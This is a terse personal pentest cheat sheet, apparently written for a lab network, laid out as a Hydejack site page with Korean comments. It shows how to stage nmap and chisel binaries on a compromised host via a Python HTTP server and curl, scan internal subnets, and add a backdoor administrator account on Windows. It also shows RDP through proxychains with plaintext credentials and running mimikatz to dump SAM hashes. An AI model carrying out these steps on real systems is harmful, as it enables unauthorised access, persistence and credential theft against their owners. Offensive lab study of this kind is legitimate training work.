---
layout: page
title: methology
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


```bash
arp -a
```


```bash
ip a
ip route
```


nmap 바이너리 다운로드
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

```bash
wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap
--2025-07-08 09:41:39--  https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap

python3 -m http.server 80
```

```bash
curl 10.250.180.2/nmap -o nmap
```



Chisel 다운로드
https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz   
--2025-07-08 09:46:35--  https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz

gunzip -d chisel_1.10.1_linux_amd64.gz

chmod +x chisel_1.10.1_linux_amd64

mv chisel_1.10.1_linux_amd64 chisel     # 그냥 파일 이름 바꾸기

python3 -m http.server 80
```

```bash
curl 10.250.180.2/chisel -o chisel
```



```bash
chmod +x nmap
chmod +x chisel
```




```bash
./nmap -v -sn 10.200.180.0/24 --open
```
![[Pasted image 20250708225829.png]]


```bash
./nmap 10.200.180.100 10.200.180.150 10.200.180.250 -v -Pn -oN nmap.log -T5
```






[Windows 쉘 획득 시]
```powershell
net user [USERNAME] [PASSWORD] /add
```


```powershell
net localgroup Administrators [USERNAME] /add
```


```powershell
net localgroup "Remote Management Users" [USERNAME] /add
```


```bash
proxychains -q xfreerdp /v:10.200.180.150 /u:cyberbarbie /p:marksanchez +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```



[mimikatz]
```powershell
\\tsclient\\share\mimikatz\x64\mimikatz.exe
```


```powershell
privilege::debug
token::elevate
lsadump::sam
```


